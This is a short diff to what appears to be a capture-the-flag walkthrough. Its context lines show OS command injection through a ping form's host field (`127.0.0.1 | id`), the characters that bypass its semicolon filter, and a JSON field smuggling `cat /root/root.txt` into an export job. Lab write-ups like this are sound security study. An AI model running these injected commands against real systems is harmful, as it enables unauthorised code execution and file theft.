@@ -6,7 +6,7 @@
 3. `/status` = a "connectivity" form, host param -> backend runs `ping -c 1 {host}` with `shell=True` -> OS command injection
 • ";" is filtered, but | $() backticks and newline all get through
 4. confirm RCE as web: `curl -s -X POST http://IP/internal/netcheck --data-urlencode 'host=127.0.0.1 | id'`
-5. \_{user flag}\_ -> current user is "web", so `cat /home/web/user.txt`
+5. _{user flag}_ -> current user is "web", so `cat /home/web/user.txt`
 
 <details>
   <summary>Reveal the 1st flag</summary>
@@ -36,7 +36,7 @@ curl -s -X POST http://127.0.0.1:9000/jobs/export \\
   -H "Content-Type: application/json" \\
   --data '{"report":"x.tgz /var/automation/data; cat /root/root.txt #"}'
 ```
-  -> \_{root flag}\_
+  -> _{root flag}_
 
 <details>
   <summary>Reveal the 2nd flag</summary>
